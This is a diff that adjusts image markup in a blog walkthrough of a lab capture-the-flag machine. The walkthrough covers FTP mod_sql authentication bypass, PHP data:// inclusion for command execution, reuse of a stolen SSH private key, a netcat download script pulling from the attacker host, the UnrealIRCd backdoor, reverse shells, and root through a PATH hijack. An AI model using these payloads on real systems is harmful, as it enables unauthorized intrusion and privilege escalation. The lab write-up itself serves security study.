@@ -15,23 +15,23 @@ For this challenge, I used Kali Linux, but you can use whatever you like. Once K
 
 I usually start off with a port scan. I saved the IP address into a file called t.txt and passed it to [onetwopunch.sh](/2012/05/31/port-scanning-one-two-punch/). 
 
-->![](/images/2013-12-12/01.png)<-
+![](/images/2013-12-12/01.png)
 
 After several minutes, three open TCP ports were identified:
 
-->![](/images/2013-12-12/02.png)<-
+![](/images/2013-12-12/02.png)
 
 While onetwpunch.sh started scanning for UDP ports, I started enumerating each of these open TCP ports, starting with SSH. 
 
 I simply attempted to login as the root user to see what would happen
 
-->![](/images/2013-12-12/03.png)<-
+![](/images/2013-12-12/03.png)
 
 Looks like password authentication had been disabled. In order to login, I would need to obtain the user's private key. SSH seemed a dead end for now, so I moved on to the next port, FTP. 
 
 I attempted an anonymous login, but it failed with the following results:
 
-->![](/images/2013-12-12/04.png)<-
+![](/images/2013-12-12/04.png)
 
 So anonymous logins were also disabled. On top of that, the FTP server provided no information about its make or version. However, not all was lost, as it did report that it was using mod_sql. A quick search on Google revealed an interesting mod_sql injection that could be used to bypass authentication: [http://archives.neohapsis.com/archives/bugtraq/2009-02/0076.html](http://archives.neohapsis.com/archives/bugtraq/2009-02/0076.html). 
 
@@ -43,17 +43,17 @@ USER %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --
 
 The initial attempt at trying this failed, until I changed the comment -- to #. At that point, I was able to login to the FTP server:
 
-->![](/images/2013-12-12/05.png)<-
+![](/images/2013-12-12/05.png)
 
 I explored the FTP server and found a directory called 0f756638e0737f4a0de1c53bf8937a08.
 
-->![](/images/2013-12-12/06.png)<-
+![](/images/2013-12-12/06.png)
 
 This directory contained several PHP files. Unfortunately I couldn’t download any of them due to permission settings on the directory and the files. This in turn led me to enumerating the last open TCP port 80 that nmap discovered.
 
 The webpage at http://192.168.1.133 only displayed an image. The source code implied that this was the index.html and artwork.jpg files that were in the FTP server. Assuming that was true, http://192.168.1.133/0f756638e0737f4a0de1c53bf8937a08 should display the index.php file: 
 
-->![](/images/2013-12-12/07.png)<-
+![](/images/2013-12-12/07.png)
 
 Each of the links under menu referenced a PHP file that was loaded onto the page when it was clicked. My first thought was it might be vulnerable to some form of file inclusion. When a link is clicked, the URL becomes
 
@@ -81,11 +81,11 @@ The next thing I tried was to see if I could use the PHP data stream to execute 
 http://192.168.1.133/0f756638e0737f4a0de1c53bf8937a08/index.php?page=data://text/plain,%3C?php%20system%28%22uname%20-a%22%29;%20?%3E
 ```
 
-->![](/images/2013-12-12/08.png)<-
+![](/images/2013-12-12/08.png)
 
 It worked! At this point I had remote command execution which I used to further enumerate the server. By reading the contents of /etc/passwd I found two users on the server; jetta and mauk. Reading /etc/\*relea\* revealed that the server was running RedHat Fedora 17. Using netstat I found two TCP ports, 3306 and 6667, bound to 127.0.0.1 More interestingly, listing the permissions in /home showed that user mauk’s home directory was readable. Listing the contents of /home/mauk returned the following:
 
-->![](/images/2013-12-12/09.png)<-
+![](/images/2013-12-12/09.png)
 
 The private and publish SSH keys are readable. Having established that a private key is required to login to the server, I thought it was worth a try to download mauk's id_rsa and see if I could use that to get a proper shell. id_rsa contains the following:
 
@@ -121,7 +121,7 @@ aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg==
 
 Having saved this on my machine, I set it to read only permissions to prevent SSH from complaining and used it to login to the target: 
 
-->![](/images/2013-12-12/10.png)<-
+![](/images/2013-12-12/10.png)
 
 Once logged in, the first thing I tried was sudo -l to see if I could run anything as root. Unfortunately this prompted me for a password which I didn't have, so I cancelled it. I decided to enumerate TCP ports 3306 and 6667 that were listening on 127.0.0.1.
 
@@ -131,11 +131,11 @@ Port 6667 is typically used by ircd. I wanted to connect to it but noticed that 
 
 A few changes needed to be made to get it to compile without errors. I commented out line 1319 in netcat.c:
 
-->![](/images/2013-12-12/11.png)<-
+![](/images/2013-12-12/11.png)
 
 Next, I modified the Makefile and added -DGAPING_SECURITY_HOLE to the XFLAGS in line 70: 
 
-->![](/images/2013-12-12/12.png)<-
+![](/images/2013-12-12/12.png)
 
 Finally I built it using make linux. Now that netcat was compiled, I needed a way to transfer it. Fortunately python was installed on the server. I wrote the following python script which would download the statically linked netcat to the target:
 
@@ -147,37 +147,37 @@ urllib.urlretrieve("http://192.168.1.130/" + sys.argv[1], sys.argv[1]);
 
 I saved this as grab.py. Finally I copied netcat to /var/www on my machine and start the Apache webserver. Using grab.py, I transferred netcat over:
 
-->![](/images/2013-12-12/13.png)<-
+![](/images/2013-12-12/13.png)
 
 After that little detour I was finally able to connect to port 6667. It definitely appeared to be ircd but provided very little information:
 
-->![](/images/2013-12-12/14.png)<-
+![](/images/2013-12-12/14.png)
 
 With not much to go on from the output, I used ps and located the ircd process. It was running as user jetta and was in /opt/Unreal/src
 
-->![](/images/2013-12-12/15.png)<-
+![](/images/2013-12-12/15.png)
 
 Unfortunately mauk had no permission to read /opt/Unreal so I was unable to get more information about the process. Hitting up Google, I found reports that some versions of Unreal ircd was backdoored: [http://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html](http://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html). I thought it was worth a shot. 
 
 Triggering the backdoor was simple. I just had to send the string "AB;" followed by the command to execute. Using my copy of netcat on the target, I tried to use the backdoor to create an empty file /tmp/pwnd:
 
-->![](/images/2013-12-12/16.png)<-
+![](/images/2013-12-12/16.png)
 
 It worked! The file was created and owned by user jetta. Using netcat on the server, I was able to setup a reverse shell which gave me shell access as user jetta:
 
-->![](/images/2013-12-12/17.png)<-
+![](/images/2013-12-12/17.png)
 
 I was now logged in as jetta. As before, I tried sudo -l but it complained that I didn’t have a tty. No problem, I could create one using python:
 
-->![](/images/2013-12-12/18.png)<-
+![](/images/2013-12-12/18.png)
 
 Looks like jetta can run something called auth_server using sudo without being prompted for a password. I ran this program to see what it did: 
 
-->![](/images/2013-12-12/19.png)<-
+![](/images/2013-12-12/19.png)
 
 It looked like the program attempted to connect to some server and then failed. I used the strings command on the auth_server binary to see if I could get more information out of it.
 
-->![](/images/2013-12-12/20.png)<-
+![](/images/2013-12-12/20.png)
 
 The fortune command is executed and piped to /usr/bin/cowsay. What makes it interesting is that an absolute path to fortune isn’t provided, which meant I could update my PATH variable so that it executed my own version of fortune, rather than the one in /usr/bin.
 
@@ -188,15 +188,15 @@ I modified jetta’s PATH to start with /home/jetta and created /home/jetta/fort
 /bin/bash
 ```
 
-->![](/images/2013-12-12/21.png)<-
+![](/images/2013-12-12/21.png)
 
 Executing sudo ./auth_server now presented me with a root shell. Sort of.
 
-->![](/images/2013-12-12/22.png)<-
+![](/images/2013-12-12/22.png)
 
 The problem was that no output was returned to any commands I typed, until I exited the shell. This was because the output was being piped to the cowsay commands. However, the output printed by cowsay definitely confirmed that I was running commands as root. No problem, I started up auth_server again with sudo, and created a reverse shell back to my machine, which gave me a proper root shell:
 
-->![](/images/2013-12-12/23.png)<-
+![](/images/2013-12-12/23.png)
 
 Game over at this point. Reading /root/flag.txt shows the contents 65afa0e5928b98f7ae283e16df2d43bf
 Just for kicks, I googled the hash which and found it in here: [http://hash-killer.com/dict/6/5/a/f](http://hash-killer.com/dict/6/5/a/f)
